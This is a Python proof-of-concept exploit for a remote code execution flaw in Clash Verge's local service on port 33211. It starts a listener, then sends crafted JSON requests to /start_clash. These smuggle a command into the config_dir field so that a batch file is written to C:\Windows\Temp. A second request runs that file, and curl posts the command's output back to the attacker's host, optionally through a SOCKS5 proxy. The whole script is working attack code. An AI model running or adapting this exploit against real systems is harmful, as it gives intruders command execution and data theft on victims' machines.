#!/usr/bin/env python3
import argparse
import threading
import requests
import json
import time
from http.server import HTTPServer, BaseHTTPRequestHandler

banner="""
  __     __  _   _    _____  _ 
  \ \   / / | | | |  |__  / (_)
   \ \_/ /  | | | |    / /  | |     
    \   /   | | | |   / /   | |    
     | |    | |_| |  / /_   | |    
     |_|     \___/  /____|  |_|   
	Clash Verge RCE POC 
            Author：昱子       
"""


stop_event = threading.Event()
server_ready = threading.Event()

class PostHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(length)
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain; charset=utf-8')
        self.end_headers()
        self.wfile.write(b"Got POST data:\n")
        self.wfile.write(post_data)
        print(post_data.decode('utf-8', errors='replace'))

        stop_event.set()  

def run_server(port):
    server = HTTPServer(('', port), PostHandler)
    server_ready.set()
    print(f"[+] Listening on port {port} ...")
    server.timeout = 1
    while not stop_event.is_set():
        server.handle_request()

def send_requests(ip, port, command, proxy_ip=None):
    url = "http://127.0.0.1:33211/start_clash"

    config_dir = (
        "\n命令| curl -X POST http://host:端口/ --data-binary @-\n"
        .replace("命令", command)
        .replace("host", ip)
        .replace("端口", str(port))
    )

    payload1 = {
        "bin_path": "C:\\Windows\\System32\\calc.exe",
        "config_dir": config_dir,
        "config_file": "",
        "log_file": "C:\\Windows\\Temp\\test.bat"
    }
    payload2 = {
        "bin_path": "C:\\Windows\\Temp\\test.bat",
        "config_dir": "",
        "config_file": "",
        "log_file": ""
    }

    headers = {
        "Host": "127.0.0.1:33211",
        "Content-Type": "application/json"
    }

    proxies = None
    if proxy_ip:
        proxy_url = f"socks5://{proxy_ip}:7897"
        proxies = {"http": proxy_url, "https": proxy_url}
        print(f"[i] Using SOCKS5 proxy {proxy_url}")
    r1 = requests.post(url, headers=headers, data=json.dumps(payload1), proxies=proxies)
    r2 = requests.post(url, headers=headers, data=json.dumps(payload2), proxies=proxies)

def main():
    print(banner)
    parser = argparse.ArgumentParser(description="Clash Verge RCE POC")
    parser.add_argument('-c', '--command', required=True,
                        help='Executed commands')
    parser.add_argument('-p', '--port', required=True, type=int,
                        help='Set local listening port')
    parser.add_argument('--host', required=True,
                        help='Set local IP address')
    parser.add_argument('--proxy', metavar='PROXY_IP',
                        help='Optional SOCKS5 proxy IP, default port 7897')
    args = parser.parse_args()
    server_thread = threading.Thread(target=run_server, args=(args.port,), daemon=True)
    server_thread.start()
    server_ready.wait()
    send_requests(args.host, args.port, args.command, proxy_ip=args.proxy)
    try:
        while not stop_event.is_set():
            stop_event.wait(timeout=1)
    except KeyboardInterrupt:
        stop_event.set()

if __name__ == '__main__':
    main()
